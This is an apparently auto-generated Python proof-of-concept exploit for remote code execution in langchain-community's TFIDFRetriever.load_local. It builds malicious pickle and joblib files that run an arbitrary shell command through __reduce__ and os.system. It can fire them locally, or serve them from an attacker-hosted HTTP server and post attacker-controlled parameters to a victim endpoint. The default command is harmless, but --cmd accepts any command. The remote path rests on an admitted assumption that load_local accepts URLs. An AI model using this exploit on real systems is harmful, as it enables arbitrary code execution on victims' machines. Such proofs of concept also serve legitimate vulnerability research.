#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_22.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE via load_local

Vulnerability: The load_local function in TFIDFRetriever allows arbitrary code
execution when allow_dangerous_deserialization=True. An attacker who can control
folder_path and file_name parameters can force the application to load a malicious
pickle/joblib file, leading to RCE.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Hosting it via a simple HTTP server (or using a local path)
3. Triggering the vulnerable function with attacker-controlled parameters

Usage:
    python3 poc.py --target http://victim:8000 --lhost <your_ip> --lport 9999
    or
    python3 poc.py --local  # Test locally against the library directly
"""

import argparse
import base64
import os
import pickle
import subprocess
import sys
import tempfile
import time
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

# Try to import the vulnerable library
try:
    from langchain_community.retrievers import TFIDFRetriever
    HAS_LANGCHAIN = True
except ImportError:
    HAS_LANGCHAIN = False


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    Uses __reduce__ to execute arbitrary code during unpickling.
    The command is benign by default (touch /tmp/poc_success.txt).
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPayload())


def create_malicious_joblib(command: str) -> bytes:
    """
    Create a malicious joblib file (which is just pickle under the hood).
    """
    return create_malicious_pickle(command)


def start_http_server(directory: str, port: int) -> HTTPServer:
    """
    Start a simple HTTP server to serve malicious files.
    """
    os.chdir(directory)
    handler = SimpleHTTPRequestHandler
    server = HTTPServer(('0.0.0.0', port), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] HTTP server started on port {port}")
    return server


def exploit_remote(target_url: str, lhost: str, lport: int, command: str):
    """
    Exploit the vulnerability remotely by:
    1. Hosting malicious files on our server
    2. Making the victim load them via the vulnerable function
    
    Note: This assumes the victim application exposes the load_local function
    via an API endpoint that accepts folder_path, file_name, and 
    allow_dangerous_deserialization parameters.
    """
    import requests
    
    # Create malicious files in a temp directory
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create malicious .pkl file
        pkl_payload = create_malicious_pickle(command)
        pkl_path = Path(tmpdir) / "exploit.pkl"
        with open(pkl_path, "wb") as f:
            f.write(pkl_payload)
        
        # Create malicious .joblib file (needed for the vectorizer)
        joblib_payload = create_malicious_joblib(command)
        joblib_path = Path(tmpdir) / "exploit.joblib"
        with open(joblib_path, "wb") as f:
            f.write(joblib_payload)
        
        # Start HTTP server to serve the files
        server = start_http_server(tmpdir, lport)
        
        try:
            # The victim should load from our server
            # This assumes the victim's load_local function accepts URLs
            # or we can use a path traversal to point to our server
            payload = {
                "folder_path": f"http://{lhost}:{lport}",
                "file_name": "exploit",
                "allow_dangerous_deserialization": True
            }
            
            print(f"[*] Sending exploit payload to {target_url}")
            print(f"[*] Payload: {payload}")
            
            # Send the request
            response = requests.post(
                target_url,
                json=payload,
                timeout=10
            )
            
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection failed. Is the target running?")
        except requests.exceptions.Timeout:
            print("[-] Request timed out")
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            server.shutdown()


def exploit_local(command: str):
    """
    Exploit the vulnerability locally by directly calling the vulnerable function.
    """
    if not HAS_LANGCHAIN:
        print("[-] langchain-community is not installed.")
        print("[*] Install it with: pip install langchain-community")
        sys.exit(1)
    
    # Create a temporary directory with malicious files
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create malicious .pkl file
        pkl_payload = create_malicious_pickle(command)
        pkl_path = Path(tmpdir) / "exploit.pkl"
        with open(pkl_path, "wb") as f:
            f.write(pkl_payload)
        
        # Create malicious .joblib file
        joblib_payload = create_malicious_joblib(command)
        joblib_path = Path(tmpdir) / "exploit.joblib"
        with open(joblib_path, "wb") as f:
            f.write(joblib_payload)
        
        print(f"[*] Created malicious files in {tmpdir}")
        print(f"[*] Triggering load_local with allow_dangerous_deserialization=True")
        
        try:
            # Trigger the vulnerability
            # Note: This will execute our command during unpickling
            result = TFIDFRetriever.load_local(
                folder_path=tmpdir,
                file_name="exploit",
                allow_dangerous_deserialization=True
            )
            print(f"[*] load_local returned: {result}")
        except Exception as e:
            print(f"[*] Exception (expected due to incomplete data): {e}")
        
        # Check if our command was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command executed! /tmp/poc_success.txt created")
        else:
            print("[-] Command may not have executed. Check manually.")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community RCE via load_local"
    )
    
    # Target specification
    parser.add_argument(
        "--target",
        help="Target URL (e.g., http://victim:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--local",
        action="store_true",
        help="Test locally against the library"
    )
    
    # Network options for remote exploit
    parser.add_argument("--lhost", help="Local IP for serving malicious files")
    parser.add_argument("--lport", type=int, default=9999, help="Local port")
    
    # Command to execute (benign by default)
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    if not args.local and not args.target:
        print("[-] Specify either --local or --target")
        parser.print_help()
        sys.exit(1)
    
    if args.local:
        print("[*] Testing locally...")
        exploit_local(args.cmd)
    else:
        if not args.lhost:
            print("[-] --lhost is required for remote exploit")
            sys.exit(1)
        print(f"[*] Exploiting remote target: {args.target}")
        exploit_remote(args.target, args.lhost, args.lport, args.cmd)


if __name__ == "__main__":
    print("=" * 60)
    print("langchain-community RCE PoC (CVE-like)")
    print("Vulnerability: load_local with allow_dangerous_deserialization=True")
    print("=" * 60)
    print()
    
    main()
